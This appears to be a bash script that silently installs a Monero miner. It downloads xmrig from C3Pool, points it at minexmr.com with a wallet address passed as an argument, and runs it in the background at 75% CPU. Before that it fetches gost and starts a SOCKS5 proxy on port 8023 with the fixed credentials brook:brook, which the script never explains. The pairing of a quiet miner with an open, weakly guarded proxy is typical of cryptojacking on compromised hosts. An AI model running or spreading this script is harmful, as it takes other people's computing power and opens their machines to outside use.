#!/bin/bash

# add gost 
wget --no-check-certificate -N "https://github.com/ginuerzh/gost/releases/download/v2.11.2/gost-linux-amd64-2.11.2.gz"
gzip -d gost-linux-amd64-2.11.2.gz
chmod +x gost-linux-amd64-2.11.2
nohup ./gost-linux-amd64-2.11.2 -L=socks5://brook:brook@:8023 &

VERSION=2.11

# command line arguments
WALLET=$1
PORT=$(( 4444 ))

# checking prerequisites
if [ -z $WALLET ]; then
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi


# start doing stuff: preparing miner
killall -9 xmrig
rm -rf $HOME/c3pool

echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
if ! curl -L --progress-bar "http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "发生错误: 无法下载 http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool"
[ -d $HOME/c3pool ] || mkdir $HOME/c3pool
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
  echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录"
  exit 1
fi
rm /tmp/xmrig.tar.gz

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi

sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
sed -i 's/"url": *"[^"]*",/"url": "us-west.minexmr.com:'$PORT'",/' $HOME/c3pool/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $HOME/c3pool/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json

chmod +x $HOME/c3pool/xmrig
nohup $HOME/c3pool/xmrig --config=$HOME/c3pool/config.json &